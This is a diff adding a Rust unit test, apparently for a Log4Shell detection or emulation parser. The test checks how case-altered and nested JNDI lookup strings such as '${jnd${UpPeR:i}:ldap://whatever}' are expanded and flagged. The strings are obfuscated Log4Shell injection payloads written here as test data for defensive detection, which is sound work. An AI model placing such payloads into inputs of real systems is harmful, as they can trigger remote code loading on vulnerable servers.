@@ -60,6 +60,27 @@ fn unicode_obfuscated() {
     assert!(findings.saw_jndi);
 }
 #[test]
+fn various_case_rules() {
+    // It appears that log4j handles tokens like `LoWeR` and `jNdi`, but not unicode characters
+    // that would lowercase to the same thing. Don't know where the matching happens in log4j yet.
+    let (result, findings) =
+        parseu("does this get blocked? ${jndı:ldap://whatever}");
+    assert_eq!("does this get blocked? ", result); // the unknown `jndı` expands to empty string
+    assert!(!findings.saw_jndi);
+
+    // but regular caps do the trick
+    let (result, findings) =
+        parseu("does this get blocked? ${jndI:ldap://whatever}");
+    assert_eq!("does this get blocked? jndI:ldap://whatever", result);
+    assert!(findings.saw_jndi);
+
+    // and work in nested evaluations too
+    let (result, findings) =
+        parseu("does this get blocked? ${jnd${UpPeR:i}:ldap://whatever}");
+    assert_eq!("does this get blocked? jndI:ldap://whatever", result);
+    assert!(findings.saw_jndi);
+}
+#[test]
 fn default_dollar() {
     assert_eq!("$", parseu_string("${::-$}"));
 }
